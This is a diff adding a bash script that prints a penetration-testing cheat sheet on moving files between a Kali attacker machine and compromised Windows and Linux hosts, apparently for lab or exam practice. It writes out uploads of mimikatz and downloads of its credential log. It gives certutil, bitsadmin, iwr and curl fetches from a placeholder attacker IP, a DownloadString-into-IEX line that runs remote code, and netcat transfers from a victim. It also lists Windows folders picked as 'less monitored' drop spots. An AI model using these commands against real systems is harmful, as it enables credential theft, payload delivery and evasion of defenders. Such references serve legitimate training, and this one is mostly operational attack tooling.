@@ -1,0 +1,74 @@
+#!/bin/bash
+BOLD='\033[1m'
+CYAN='\033[36m'
+GREEN='\033[32m'
+YELLOW='\033[33m'
+BLUE='\033[34m'
+NC='\033[0m'
+
+printf "\n"
+echo -e "${BOLD}${YELLOW}── FILE TRANSFER ────────────────────────────────────${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── SMB Server (Kali -> Windows) ─────────────────────${NC}"
+echo -e "  ${GREEN}impacket-smbserver duar . -smb2support -username ardias -password ardias${NC}  # Kali"
+echo -e "  ${GREEN}net use m: \\\\\\\\192.168.45.229\\\\duar /user:ardias ardias${NC}  # Windows mount"
+echo -e "  ${GREEN}copy mimikatz.log m:\\\\${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── RDP Shared Folder ────────────────────────────────${NC}"
+echo -e "  ${GREEN}xfreerdp /cert-ignore /compression /auto-reconnect /u:<USER> /p:<PASS> /v:<TARGET> /drive:share,/home/kali/tools${NC}"
+echo -e "  Note: In RDP session: copy file \\\\tsclient\\share\\tool.exe"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── evil-winrm Upload/Download ───────────────────────${NC}"
+echo -e "  ${GREEN}upload mimikatz.exe 'C:\Windows\Tasks\mimikatz.exe'${NC}"
+echo -e "  ${GREEN}download mimikatz.log /home/kali/loot/${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Windows Download Commands ────────────────────────${NC}"
+echo -e "  ${GREEN}iwr http://<ATTACKER_IP>/file -OutFile 'C:\Temp\file'${NC}"
+echo -e "  ${GREEN}certutil -urlcache -split -f http://<ATTACKER_IP>/file 'C:\Temp\file'${NC}"
+echo -e "  ${GREEN}(New-Object System.Net.WebClient).DownloadFile('http://<ATTACKER_IP>/file', 'C:\Temp\file')${NC}"
+echo -e "  ${GREEN}(New-Object System.Net.WebClient).DownloadString('http://<ATTACKER_IP>/file') | IEX${NC}"
+echo -e "  ${GREEN}bitsadmin /transfer job http://<ATTACKER_IP>/file C:\out${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Linux ────────────────────────────────────────────${NC}"
+echo -e "  ${GREEN}wget http://<ATTACKER_IP>/file -O /tmp/file${NC}"
+echo -e "  ${GREEN}curl -o /tmp/file http://<ATTACKER_IP>/file${NC}"
+echo -e "  ${GREEN}scp user@<TARGET>:/path/file.zip /local/path/${NC}"
+echo -e "  ${GREEN}rsync -avz user@<TARGET>:/path/file.zip /local/path/${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Netcat ───────────────────────────────────────────${NC}"
+echo -e "  ${GREEN}nc -lp 5151 < file.zip${NC}                            # victim sends"
+echo -e "  ${GREEN}nc <VICTIM_IP> 5151 > file.zip${NC}                    # Kali receives"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Impacket psexec/wmiexec (built-in) ───────────────${NC}"
+echo -e "  ${GREEN}lput mimikatz.exe${NC}                                  # uploads to C:\Windows\\"
+echo -e "  ${GREEN}lget mimikatz.log${NC}                                  # downloads from C:\Windows\\"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Python HTTP Server ───────────────────────────────${NC}"
+echo -e "  ${GREEN}python3 -m http.server 80${NC}                         # serve current dir"
+echo -e "  ${GREEN}python3 -m http.server 8080${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Safe Drop Locations (Windows) ────────────────────${NC}"
+echo -e "  Note: C:\\Windows\\Temp\\              writable, less monitored"
+echo -e "  Note: C:\\ProgramData\\               common legitimate location"
+echo -e "  Note: C:\\Users\\Public\\              world-writable"
+echo -e "  Note: C:\\Windows\\System32\\spool\\drivers\\color\\  often overlooked"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Ligolo File Transfer (via tunnel) ────────────────${NC}"
+echo -e "  Note: After Ligolo tunnel active, internal hosts reach Kali directly"
+echo -e "  ${GREEN}python3 -m http.server 80${NC}                         # Kali"
+echo -e "  ${GREEN}certutil -urlcache -split -f http://<KALI_IP>/nc.exe 'C:\Windows\Temp\nc.exe'${NC}  # target"
+echo -e "  ${GREEN}listener_add --addr 0.0.0.0:8080 --to 127.0.0.1:80 --tcp${NC}  # ligolo: forward port"
+printf "\n"
+
+printf "\n"
+echo -e "${YELLOW}─────────────────────────────────────────────────────${NC}"
